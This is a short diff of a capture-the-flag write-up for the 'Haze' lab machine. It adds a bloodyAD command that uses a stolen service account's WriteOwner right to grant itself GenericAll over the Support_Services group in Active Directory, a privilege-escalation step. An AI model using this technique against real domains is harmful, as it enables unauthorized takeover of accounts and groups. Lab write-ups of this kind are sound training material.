@@ -471,3 +471,10 @@ Now i have the NTLM of the service account
 
 This account has WriteOwner over the support services group
 
+```python
+
+```
+
+```python
+bloodyAD --host dc01.haze.htb -d haze.htb -u 'Haze-IT-Backup$' -p '' add genericAll Support_Services 'Haze-IT-Backup$'
+```
